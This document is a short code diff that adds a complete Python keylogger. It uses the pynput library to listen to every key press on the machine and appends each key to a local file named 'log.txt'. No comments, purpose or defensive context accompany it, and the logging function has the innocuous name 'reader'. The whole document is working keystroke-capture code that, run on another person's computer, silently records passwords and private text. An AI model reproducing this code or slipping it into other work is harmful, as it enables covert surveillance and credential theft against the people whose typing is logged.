@@ -1,0 +1,8 @@
+from pynput.keyboard import Listener
+
+def reader(file, key):
+    with open(file, "a") as f:
+        f.write(str(key) + "\n")
+
+with Listener(on_press=lambda key: reader("log.txt", key)) as listener:
+    listener.join()
